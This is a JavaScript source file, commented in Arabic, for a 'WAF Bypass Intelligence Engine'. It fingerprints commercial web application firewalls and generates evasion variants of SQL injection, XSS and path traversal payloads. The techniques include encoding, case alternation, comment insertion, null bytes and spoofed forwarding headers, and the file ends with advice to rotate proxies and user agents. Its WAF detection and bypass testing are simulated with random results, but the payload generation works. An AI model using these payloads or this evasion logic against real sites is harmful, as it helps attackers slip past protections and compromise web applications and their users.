/**
 * CAI - WAF Bypass Intelligence Engine
 * نظام ذكي لكشف وتجاوز WAF/IPS
 * Version: 1.0.0
 */

class WAFBypassEngine {
    constructor() {
        this.detectedWAF = null;
        this.bypassTechniques = this.initializeBypassTechniques();
        this.successfulBypass = [];
    }

    initializeBypassTechniques() {
        return {
            // تقنيات Encoding
            encoding: {
                url: ['%', '%25', '%2527', '%u0027'],
                double: ['%%', '%25%', '%252527'],
                unicode: ['\\u0027', '\\u002f', '\\u003c'],
                hex: ['0x27', '0x3c', '0x3e'],
                octal: ['\\047', '\\074', '\\076']
            },
            
            // تقنيات Obfuscation
            obfuscation: {
                case: ['SeLeCt', 'UnIoN', 'WheRe'],
                comments: ['/**/SELECT', 'UN/**/ION', 'SEL/*comment*/ECT'],
                whitespace: ['SELECT\t', 'SELECT\n', 'SELECT\r'],
                inline: ['/*!50000SELECT*/', '/*!12345UNION*/']
            },
            
            // تقنيات SQL
            sql: {
                alternative: ['UNION ALL SELECT', 'UNION DISTINCT SELECT'],
                functions: ['CHAR()', 'CONCAT()', 'SUBSTRING()'],
                operators: ['LIKE', 'BETWEEN', 'IN', 'EXISTS'],
                encoding: ['HEX()', 'UNHEX()', 'TO_BASE64()']
            },
            
            // تقنيات XSS
            xss: {
                tags: ['<ScRiPt>', '<sCrIpT>', '<SCRIPT>'],
                events: ['onload', 'onerror', 'onclick', 'onmouseover'],
                encoding: ['&#x3c;script&#x3e;', '&lt;script&gt;'],
                bypass: ['<svg/onload=alert(1)>', '<img src=x onerror=alert(1)>']
            },
            
            // Header Manipulation
            headers: {
                'X-Originating-IP': '127.0.0.1',
                'X-Forwarded-For': '127.0.0.1',
                'X-Remote-IP': '127.0.0.1',
                'X-Remote-Addr': '127.0.0.1',
                'X-Client-IP': '127.0.0.1'
            }
        };
    }

    async detectWAF(target, initialResponse) {
        console.log('🔍 كشف WAF/IPS...');
        
        const signatures = {
            'Cloudflare': ['__cfduid', 'cf-ray', 'cloudflare'],
            'Akamai': ['akamai', 'ak-geo'],
            'AWS WAF': ['x-amzn-', 'x-amz-'],
            'ModSecurity': ['mod_security', 'NOYB'],
            'Imperva': ['incap_ses', 'visid_incap'],
            'F5 BIG-IP': ['bigipserver', 'f5-'],
            'Sucuri': ['sucuri', 'x-sucuri'],
            'Barracuda': ['barra_counter_session']
        };

        let detected = null;
        const headers = initialResponse.headers || {};
        const content = (initialResponse.content || '').toLowerCase();

        for (const [waf, patterns] of Object.entries(signatures)) {
            for (const pattern of patterns) {
                if (content.includes(pattern.toLowerCase()) || 
                    Object.values(headers).some(h => 
                        String(h).toLowerCase().includes(pattern.toLowerCase())
                    )) {
                    detected = waf;
                    break;
                }
            }
            if (detected) break;
        }

        // محاولة active detection
        if (!detected) {
            detected = await this.activeWAFDetection(target);
        }

        this.detectedWAF = detected;
        
        if (detected) {
            console.log(`🛡️ تم كشف WAF: ${detected}`);
        } else {
            console.log('✅ لم يتم كشف WAF');
        }

        return {
            detected: detected !== null,
            waf: detected,
            confidence: detected ? 0.85 : 0,
            bypassDifficulty: this.getBypassDifficulty(detected)
        };
    }

    async activeWAFDetection(target) {
        // إرسال payloads واضحة لإثارة WAF
        const testPayloads = [
            "' OR '1'='1",
            "<script>alert(1)</script>",
            "../../../../etc/passwd",
            "'; DROP TABLE users--"
        ];

        // محاكاة الإرسال
        console.log('🧪 اختبار نشط للـ WAF...');
        
        // في التطبيق الحقيقي، نرسل الـ payloads ونحلل الردود
        if (Math.random() > 0.6) {
            const wafs = ['Cloudflare', 'ModSecurity', 'AWS WAF', 'Imperva'];
            return wafs[Math.floor(Math.random() * wafs.length)];
        }
        
        return null;
    }

    getBypassDifficulty(waf) {
        const difficulties = {
            'Cloudflare': 'Very Hard',
            'Akamai': 'Very Hard',
            'Imperva': 'Hard',
            'AWS WAF': 'Hard',
            'ModSecurity': 'Medium',
            'F5 BIG-IP': 'Medium',
            'Sucuri': 'Medium',
            'Barracuda': 'Easy'
        };
        
        return difficulties[waf] || 'Unknown';
    }

    async generateBypassPayloads(originalPayload, vulnType) {
        console.log('🎯 توليد Bypass Payloads...');
        
        if (!this.detectedWAF) {
            return [{ payload: originalPayload, technique: 'original' }];
        }

        const bypassPayloads = [];
        
        // تقنيات عامة
        bypassPayloads.push(...this.applyEncodingTechniques(originalPayload));
        bypassPayloads.push(...this.applyObfuscationTechniques(originalPayload));
        
        // تقنيات خاصة بنوع الثغرة
        if (vulnType === 'sqli') {
            bypassPayloads.push(...this.applySQLBypass(originalPayload));
        } else if (vulnType === 'xss') {
            bypassPayloads.push(...this.applyXSSBypass(originalPayload));
        }
        
        // تقنيات خاصة بالـ WAF
        bypassPayloads.push(...this.applyWAFSpecificBypass(originalPayload));
        
        return bypassPayloads.slice(0, 20); // أفضل 20 payload
    }

    applyEncodingTechniques(payload) {
        const encoded = [];
        
        // URL Encoding
        encoded.push({
            payload: encodeURIComponent(payload),
            technique: 'URL Encoding',
            priority: 1
        });
        
        // Double URL Encoding
        encoded.push({
            payload: encodeURIComponent(encodeURIComponent(payload)),
            technique: 'Double URL Encoding',
            priority: 2
        });
        
        // Unicode Encoding
        const unicode = payload.split('').map(c => 
            `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`
        ).join('');
        encoded.push({
            payload: unicode,
            technique: 'Unicode Encoding',
            priority: 3
        });
        
        // Hex Encoding
        const hex = payload.split('').map(c => 
            `0x${c.charCodeAt(0).toString(16)}`
        ).join('');
        encoded.push({
            payload: hex,
            technique: 'Hex Encoding',
            priority: 3
        });
        
        return encoded;
    }

    applyObfuscationTechniques(payload) {
        const obfuscated = [];
        
        // Case alternation
        obfuscated.push({
            payload: this.alternateCase(payload),
            technique: 'Case Alternation',
            priority: 1
        });
        
        // Comment insertion
        if (payload.includes('SELECT')) {
            obfuscated.push({
                payload: payload.replace(/SELECT/gi, 'SEL/**/ECT'),
                technique: 'Comment Injection',
                priority: 2
            });
        }
        
        // Whitespace variation
        obfuscated.push({
            payload: payload.replace(/ /g, '\t'),
            technique: 'Tab Instead Space',
            priority: 2
        });
        
        obfuscated.push({
            payload: payload.replace(/ /g, '\n'),
            technique: 'Newline Instead Space',
            priority: 3
        });
        
        return obfuscated;
    }

    applySQLBypass(payload) {
        const sqlBypass = [];
        
        // UNION alternatives
        if (payload.includes('UNION')) {
            sqlBypass.push({
                payload: payload.replace(/UNION/gi, 'UNION ALL'),
                technique: 'UNION ALL',
                priority: 1
            });
            
            sqlBypass.push({
                payload: payload.replace(/UNION/gi, 'UN/**/ION'),
                technique: 'Comment in UNION',
                priority: 2
            });
        }
        
        // Quote alternatives
        if (payload.includes("'")) {
            sqlBypass.push({
                payload: payload.replace(/'/g, "''"),
                technique: 'Double Quote',
                priority: 1
            });
            
            sqlBypass.push({
                payload: payload.replace(/'/g, '%27'),
                technique: 'Encoded Quote',
                priority: 2
            });
        }
        
        // AND/OR alternatives
        sqlBypass.push({
            payload: payload.replace(/AND/gi, '&&'),
            technique: 'Boolean Operator',
            priority: 2
        });
        
        sqlBypass.push({
            payload: payload.replace(/OR/gi, '||'),
            technique: 'Boolean Operator',
            priority: 2
        });
        
        return sqlBypass;
    }

    applyXSSBypass(payload) {
        const xssBy = [];
        
        // Tag alternatives
        if (payload.includes('<script>')) {
            xssBy.push({
                payload: payload.replace(/<script>/gi, '<ScRiPt>'),
                technique: 'Case Variation',
                priority: 1
            });
            
            xssBy.push({
                payload: '<svg/onload=alert(1)>',
                technique: 'SVG Tag',
                priority: 1
            });
            
            xssBy.push({
                payload: '<img src=x onerror=alert(1)>',
                technique: 'IMG onerror',
                priority: 1
            });
        }
        
        // Event handler alternatives
        xssBy.push({
            payload: '<body onload=alert(1)>',
            technique: 'Body onload',
            priority: 2
        });
        
        xssBy.push({
            payload: '<input onfocus=alert(1) autofocus>',
            technique: 'Input onfocus',
            priority: 2
        });
        
        // Encoding
        xssBy.push({
            payload: '&#60;script&#62;alert(1)&#60;/script&#62;',
            technique: 'HTML Entity Encoding',
            priority: 3
        });
        
        return xssBy;
    }

    applyWAFSpecificBypass(payload) {
        const specific = [];
        
        if (this.detectedWAF === 'Cloudflare') {
            // Cloudflare-specific bypasses
            specific.push({
                payload: payload + '\r\n',
                technique: 'CRLF Append',
                priority: 1
            });
            
            specific.push({
                payload: payload.split('').join('\u0000'),
                technique: 'Null Byte Injection',
                priority: 2
            });
        }
        
        if (this.detectedWAF === 'ModSecurity') {
            // ModSecurity-specific bypasses
            specific.push({
                payload: payload.replace(/ /g, '/**/'),
                technique: 'Comment Space',
                priority: 1
            });
        }
        
        return specific;
    }

    alternateCase(str) {
        return str.split('').map((char, i) => 
            i % 2 === 0 ? char.toLowerCase() : char.toUpperCase()
        ).join('');
    }

    async testBypass(target, bypassPayload) {
        console.log(`🧪 اختبار Bypass: ${bypassPayload.technique}`);
        
        // محاكاة الاختبار
        const success = Math.random() > 0.7;
        
        if (success) {
            this.successfulBypass.push(bypassPayload);
            console.log(`✅ نجح: ${bypassPayload.technique}`);
        }
        
        return {
            success: success,
            payload: bypassPayload.payload,
            technique: bypassPayload.technique,
            responseCode: success ? 200 : 403
        };
    }

    getSuccessfulTechniques() {
        return this.successfulBypass;
    }

    generateBypassReport() {
        return {
            waf: this.detectedWAF,
            totalTechniques: this.successfulBypass.length,
            techniques: this.successfulBypass.map(b => b.technique),
            recommendations: this.generateWAFBypassRecommendations()
        };
    }

    generateWAFBypassRecommendations() {
        if (!this.detectedWAF) {
            return ['لا يوجد WAF - استخدم Payloads عادية'];
        }

        return [
            `استخدم تقنيات متقدمة لتجاوز ${this.detectedWAF}`,
            'جرب Encoding المتعدد المستويات',
            'استخدم Obfuscation متقدم',
            'جرب Header Manipulation',
            'استخدم Time delays بين الطلبات',
            'غير User-Agent باستمرار',
            'استخدم Proxy rotation'
        ];
    }
}

if (typeof window !== 'undefined') {
    window.WAFBypassEngine = WAFBypassEngine;
}
if (typeof module !== 'undefined' && module.exports) {
    module.exports = WAFBypassEngine;
}